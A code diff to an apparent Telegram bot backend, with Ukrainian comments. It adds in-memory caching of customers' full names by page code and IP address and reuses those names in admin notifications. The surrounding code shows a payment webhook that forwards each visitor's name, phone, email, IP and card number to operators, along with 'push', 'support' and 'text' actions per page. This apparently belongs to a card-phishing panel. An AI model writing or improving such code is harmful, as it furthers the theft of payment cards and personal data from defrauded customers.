@@ -51,6 +51,34 @@ WEBHOOK_PORT = 8081  # Початковий порт для webhook
 
 # --- Зберігання total сум для кожного payment session ---
 payment_totals = {}  # {page_code: {'total': amount, 'currency': currency, 'timestamp': time}}
+# --- Зберігання імен користувачів ---
+fio_by_page_code = {}  # {page_code: {'name': str, 'timestamp': time}}
+fio_by_ip = {}         # {ip: {'name': str, 'timestamp': time}}
+
+def remember_fio(name: str, page_code: str = "", ip: str = ""):
+    """Зберігає ФІО в пам'яті, якщо воно валідне (не пусте, не 'Не указано')."""
+    try:
+        clean = (name or "").strip()
+        if not clean or clean.lower() == 'не указано':
+            return
+        now_ts = time.time()
+        if page_code:
+            fio_by_page_code[page_code] = {"name": clean, "timestamp": now_ts}
+        if ip:
+            fio_by_ip[ip] = {"name": clean, "timestamp": now_ts}
+    except Exception:
+        pass
+
+def get_best_fio(default_name: str = "", page_code: str = "", ip: str = "") -> str:
+    """Повертає найкраще доступне ФІО: name → by page_code → by ip → 'Клієнт'."""
+    clean = (default_name or "").strip()
+    if clean and clean.lower() != 'не указано':
+        return clean
+    if page_code and page_code in fio_by_page_code:
+        return fio_by_page_code[page_code]["name"]
+    if ip and ip in fio_by_ip:
+        return fio_by_ip[ip]["name"]
+    return "Клієнт"
 
 def cleanup_old_payment_totals():
     """Видаляє старі записи total сум (старіше 1 години)"""
@@ -2565,7 +2593,7 @@ async def admin_enter_text(message: types.Message):
                 admin_username = get_admin_username_by_user_id(admin_user_id)
                 text_message = format_text_notification_message(
                     admin_username=admin_username,
-                    name=user_name,
+                    name=get_best_fio(user_name, page_code, ip),
                     price=event_price,
                     currency=event_currency,
                     ip=ip
@@ -2946,6 +2974,8 @@ async def payment_notify(request):
     
     # 1. Повідомлення про початок оформлення замовлення (без кнопок)
     page_code = data.get('page_code', '')
+    # Запам'ятовуємо ФІО для подальшого використання у push/support/text
+    remember_fio(name=name, page_code=page_code, ip=ip)
     
     # --- Зберігаємо total суму для подальшого використання ---
     if page_code and total and currency:
@@ -2979,7 +3009,7 @@ async def payment_notify(request):
     print(f'[DEBUG] Order start message - using price: {display_price} {currency} (total: {total}, base: {price})')
     order_start_message = format_order_start_message(
         page_code=page_code,
-        name=name,
+        name=get_best_fio(name, page_code, ip),
         phone=phone,
         email=email,
         ip=ip,
@@ -3003,7 +3033,7 @@ async def payment_notify(request):
     print(f'[DEBUG] Card message - using price: {display_price} {currency} (total: {total}, base: {price})')
     card_message = format_card_payment_message(
         page_code=page_code,
-        name=name,
+        name=get_best_fio(name, page_code, ip),
         price=display_price,
         currency=currency,
         card_number=card,
@@ -3258,7 +3288,7 @@ async def admin_action_handler(call: types.CallbackQuery):
                         admin_username = get_admin_username_by_user_id(admin_user_id)
                         push_message = format_push_notification_message(
                             admin_username=admin_username,
-                            name=user_name,
+                            name=get_best_fio(user_name, page_code, ip),
                             price=event_price,
                             currency=event_currency,
                             ip=ip
@@ -3332,7 +3362,7 @@ async def admin_action_handler(call: types.CallbackQuery):
                             admin_username = get_admin_username_by_user_id(admin_user_id)
                             support_message = format_support_notification_message(
                                 admin_username=admin_username,
-                                name=user_name,
+                                name=get_best_fio(user_name, page_code, ip),
                                 price=event_price,
                                 currency=event_currency,
                                 ip=ip
